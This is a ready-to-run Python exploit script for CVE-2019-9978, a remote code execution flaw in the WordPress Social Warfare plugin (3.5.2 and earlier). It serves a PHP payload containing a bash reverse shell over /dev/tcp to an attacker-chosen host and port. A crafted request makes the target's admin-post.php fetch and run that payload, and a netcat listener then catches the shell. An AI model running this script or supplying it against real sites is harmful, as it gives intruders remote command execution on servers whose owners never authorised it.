# Title: RCE in Social Warfare Plugin ( <=3.5.2 )
# CVE: CVE-2019-9978
# Script Authors: Jessi & Rin
# Usage: python3 social-warefare-rev.py http://example.com/wordpress/ lhost lport
# Executes a reverse shell payload and spawns a netcat listener to catch the shell

import sys
import os
import requests
import threading
import time

# Warn if no Arguments
if len(sys.argv) <= 1:
    print("Usage: python3 social-warfare-rev.py http://example.com/wordpress/ lhost lport")
    exit(1)

# Pretty ASCII Art/Intro :)
print("""\
@@@@@@@O@@@@@@@@@@@OOOOOOO@OOOOO@@@@@@@@@@@@OO@@@
@@@@@OooOO,OOOOOoooooooooooOOooooooO@@@OOOOOOO@@@
@@@@@ooooOO^=ooooooooooooooooooooooooOOOOOOOOO@@@
@@@@@ooooOOO/oooooooooooooooooooooooooOOOOOOo^@@@
@@@@@OooO/[[\oooooooooooooooooooooooOooOOOOoo=@@@
@@@@@Ooo`**/oooooooooooooooooooooooooOooOOOooO@@@
@@@@@@@OO`/ooooooooooooooooooooooooooOoooOO/@@@@@
@@@@@@@@ooooooooooooOo[ooooooooooooooOOooO@@@@@@@
@@@@@@@Oooooooo/=ooOO,oooOoooooooooooOOooOO@@@@@@
@@@@@@@OooooooO^=oOO^oooOO[oo/=ooooooOOOoOoO@@@@@
@@@@@@Ooooo/oO/`oO[ OOoO/  \O,oooooooOOOOOoO@@@@@
@@@@@@ooooo^oO^=`  ,O[`     O/oooooOOOO[OOOO@@@@@
@@@@@oooooO^O.O             ,ooooooO/= ,OOOOO@@@@
@@@OOoooooO^=^     [[\OO\            ,].OOOoo@@@@
@@@OoooooooO=\           `          O[  OOooooO@@
@@@@OOOooooOO/  ,]]]]]`                 OooooO@@@
@@@@OOOOO/  =`/`........,\`       ,]]]],OOOOO\@@@
@@@@@@@@    =...............[  /`........\@@O@@@@
@@@@@@@`   ,^.............................O@@@@@@
@@@@@@`    /...............................O@@@@@
@@@@@O     =..................../[[].......O@@@@@
@@@@@       ^..............,`[[..`   ^..../O@@@@@
@@@@O=/o]]] =`............,]]`  /    ,]`., =@@@@@
@@@@@@^                  .         =      [O@@@@@
@@@@@@@`                           ,\       O@@@@/""")
print("\n")
print("WordPress Social Warfare Plugin RCE <=3.5.2")
print("CVE-2019.9978")
print("\n")
time.sleep(5)

# Required Arguments
target = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]

# Create Background Task for HTTP Server
def payload_server():
    os.system("python3 -m http.server 80 >/dev/null 2>&1")
def setup_payload_server():
    threading.Thread(target=payload_server).start()

# Handler for Sending HTTP Request
def exploit():
    url = target + 'wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://' + lhost+'/payload.txt'
    requests.get(url)
def exploit_handler():
    threading.Thread(target=exploit).start()

# Bash Reverse Shell Payload
def shell_payload():
    cmd = 'bash -c "bash -i >& /dev/tcp/' + lhost +'/' + lport+' 0>&1"'
    f = open("payload.txt", "w")
    f.write("<pre>system('" + cmd+"')</pre>")
    f.close()

# Receive Reverse Shell
def shell():
    os.system("nc -lvnp "+ lport+"")

# Exploit
os.system("clear")
print("[!] Setting Up HTTP Server [!]")
setup_payload_server()
print("[!] Sending Payload [!]")
time.sleep(3)
shell_payload()
print("[+] Spawning Shell [+]")
time.sleep(3)
exploit_handler()
os.system("clear")
shell()
